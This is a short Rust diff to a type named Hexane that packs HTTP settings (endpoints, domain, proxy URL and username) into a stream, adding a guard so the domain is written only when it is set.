@@ -302,10 +302,13 @@ impl Hexane {
                         stream.pack_wstring(endpoint);
                     }
 
-                    stream.pack_string(http.domain.as_ref().unwrap().as_str());
+                    if http.domain.is_some() {
+                        stream.pack_string(http.domain.as_ref().unwrap().as_str());
+                    }
 
                     if let Some(ref proxy) = http.proxy { // todo: proxy should not be exclusive to http (socks5, ftp, etc...)
                         let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
+
                         stream.pack_dword(1);
                         stream.pack_wstring(&proxy_url);
                         stream.pack_wstring(proxy.username.as_ref().unwrap().as_str());
